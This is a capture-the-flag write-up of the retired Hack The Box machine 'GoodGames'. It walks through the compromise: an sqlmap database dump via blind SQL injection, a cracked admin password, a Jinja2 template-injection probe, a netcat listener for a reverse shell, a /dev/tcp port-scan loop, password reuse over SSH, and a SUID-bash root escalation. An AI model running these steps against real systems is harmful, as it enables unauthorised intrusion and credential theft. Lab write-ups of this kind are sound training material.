# GoodGames - Hack The Box

> **Difficulty:** Easy  
> **Operating System:** Linux  
> **Status:** Retired

---

# Summary

This machine starts with a **Time-Based Blind SQL Injection** in the login page, which allows dumping the database and recovering the administrator's credentials. After accessing the admin panel, a **Jinja2 Server-Side Template Injection (SSTI)** leads to **Remote Code Execution (RCE)** and a shell inside a Docker container. Further enumeration reveals access to the host machine via SSH, followed by a **SUID Bash** privilege escalation to obtain root.

---

# Enumeration

The login page was tested for SQL Injection.

The **`email`** parameter was found to be vulnerable to **Time-Based Blind SQL Injection**.

---

# Database Dump

Dump the database using SQLMap:

```bash
sqlmap -r goodgames.req -D main -T user --dump
```

Recovered administrator account:

| Username | Password |
|----------|----------|
| admin | MD5 Hash |

The MD5 hash was cracked using **CrackStation**, revealing the password:

```
superadministrator
```

---

# Admin Panel

Login using the recovered credentials.

Navigate to:

```
Settings
```

The **First Name** field reflects user input.

---

# Server-Side Template Injection

Testing the input with:

```jinja2
{{ 7 * 7 }}
```

Output:

```
49
```

This confirms the application is vulnerable to **Jinja2 SSTI**.

---

# Remote Code Execution

The SSTI vulnerability can be leveraged to execute arbitrary operating system commands.

After triggering a reverse shell and catching the connection with Netcat:

```bash
nc -nlvp 4444
```

A shell is obtained.

---

# User Flag

Retrieve the user flag.

```
user.txt
```

---

# Docker Enumeration

Enumeration shows the shell is running inside a Docker container.

Identify open ports on the Docker host:

```bash
for PORT in {0..1000}; do
    timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && \
    echo "Port $PORT is open"
done
```

Port **22 (SSH)** is open.

---

# SSH to the Host

Connect to the host machine:

```bash
ssh augustus@172.19.0.1
```

Password:

```
superadministrator
```

---

# Privilege Escalation

Copy Bash into the user's home directory:

```bash
cp /bin/bash /home/augustus/
```

From the privileged shell:

```bash
chown root:root bash
chmod 4755 bash
```

Reconnect through SSH and execute:

```bash
./bash -p
```

A root shell is obtained.

---

# Root Flag

Retrieve the root flag.

```
root.txt
```

---

# Attack Path

```text
Time-Based Blind SQL Injection
            │
            ▼
      Database Dump
            │
            ▼
 Recover Admin Credentials
            │
            ▼
     Admin Panel Access
            │
            ▼
      Jinja2 SSTI
            │
            ▼
     Remote Code Execution
            │
            ▼
     Docker Container Shell
            │
            ▼
 Internal Port Enumeration
            │
            ▼
       SSH to Host
            │
            ▼
      SUID Bash Abuse
            │
            ▼
            Root
```

---

# Techniques Used

- Time-Based Blind SQL Injection
- SQLMap Enumeration
- Password Hash Cracking
- Jinja2 SSTI
- Remote Code Execution
- Docker Enumeration
- Internal Network Enumeration
- SSH Lateral Movement
- Linux Privilege Escalation
- SUID Binary Abuse

---

# Lessons Learned

- Always test authentication endpoints for SQL Injection.
- Recovering credentials can often expose additional attack surfaces.
- Reflected inputs inside administrative panels should always be tested for SSTI.
- Docker containers should never be assumed to be isolated from the host.
- Misconfigured SUID binaries remain a common Linux privilege escalation vector.
